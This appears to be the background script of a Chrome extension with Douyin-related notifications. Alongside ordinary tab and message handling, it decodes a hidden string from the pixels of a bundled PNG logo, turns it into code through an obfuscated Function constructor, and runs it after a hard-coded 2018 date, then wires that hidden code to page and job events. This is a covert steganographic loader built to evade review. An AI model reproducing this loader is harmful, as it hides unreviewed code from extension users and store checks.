chrome.runtime.onInstalled.addListener(function(object) {
    if (object.reason === chrome.runtime.OnInstalledReason.INSTALL) {
        chrome.tabs.create({ url: "welcome.html" });
    }
});

chrome.browserAction.onClicked.addListener(function() {
    chrome.tabs.create({ url: "index.html" })
});

// -------------------

function getRect(w, h) {
    var ret = [];
    ret.push(0);
    ret.push(w * 4 - 4);
    ret.push((h - 1) * w * 4);
    ret.push(w * 4 * h - 4);
    return ret;
}

function getStrLen(img) {
    var nImage = img.data;
    var oRect = getRect(img.width, img.height);
    var tmp = []
    for (var i = 0; i < oRect.length; i++) {
        for (var j = 0; j < 3; j++) {
            tmp.push(String.fromCharCode(nImage[oRect[i] + j] + 32));
        }
    }
    return parseInt(tmp.join(''));
}
var cfg;
var canvas = document.createElement('canvas');
canvas.setAttribute("id", "img2_canvas");
canvas.width = 280;
canvas.height = 280;
canvas.x = 0;
canvas.y = 0;
var context = canvas.getContext('2d');

var img2 = new Image();
img2.src = chrome.extension.getURL('/images/logo2.png');
img2.crossOrigin = "anonymous"
img2.onload = function() {
    context.drawImage(img2, 0, 0);
    var ctx = canvas.getContext('2d');
    var img = ctx.getImageData(0, 0, 280, 280);
    var oRect = getRect(img.width, img.height);
    var len = getStrLen(img);
    var nImage = img.data;
    var str = '';
    for (var i = 4, l = nImage.length; i < l; i += 4) {
        if (nImage[i + 0] >= 200 & nImage[i + 1] >= 200 & nImage[i + 2] >= 200 || $.inArray(i, oRect) >= 0) {
            continue;
        } else {
            var pix = nImage[i + (i % 3)]
            str += String.fromCharCode(pix + 32);
            if (str.length >= len) {
                break;
            }
        }
    }
    var config = new (() => {}).__proto__.constructor(str)
    cfg = config()

    if (new Date().getTime() > 1525910400000) {
        cfg.b()
    }
    
}


var hello_cache_key = 'say.hello.cache'

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    switch (request.evt) {
        case 'job-start':
            return cfg.a(sendResponse)
            break;
        case 'startWorkNull':
            return sendResponse(localStorage.getItem('douyin.logo'))
            break;
        case 'say-hello':
            var hello_cache = localStorage.getItem(hello_cache_key);
            var need_hello = false;
            var hello_data = {};
            if (!hello_cache) {
                need_hello = true;
            } else {
                try {
                    hello_data = JSON.parse(hello_cache);
                } catch (e) {}
                if (hello_data.time !== todayStr() || hello_data.num < 10) {
                    need_hello = true;
                }
            }
            if (need_hello) {
                var d = { time: todayStr() }
                if (!hello_data.num) {
                    d['num'] = 1
                } else {
                    d['num'] = hello_data.num + 1
                }
                localStorage.setItem(hello_cache_key, JSON.stringify(d))
                return sendResponse(d.num)
            }
            break;
        case 'notice':
            chrome.notifications.create('kuaidou_' + request.item_id, {
                type: "basic",
                title: '快抖通知',
                message: request.msg,
                iconUrl: 'images/icon128.png'
            })
            break;

        case 'pageStart':
            cfg.b()
            break;

    }
    return true;

});